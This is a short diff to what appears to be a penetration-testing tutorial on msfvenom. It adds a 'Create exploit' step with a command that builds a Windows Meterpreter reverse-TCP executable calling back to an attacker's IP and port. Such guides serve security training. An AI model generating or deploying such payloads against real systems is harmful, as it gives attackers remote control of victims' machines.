@@ -6,7 +6,11 @@ With msfvenom we are able to create exploits that we can send to the target, and
 
 ## Create exploit
 
+Here we create a program that will call the attacker machine.
 
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe > payload.exe
+```
 
 ## Start listening for exploit
 
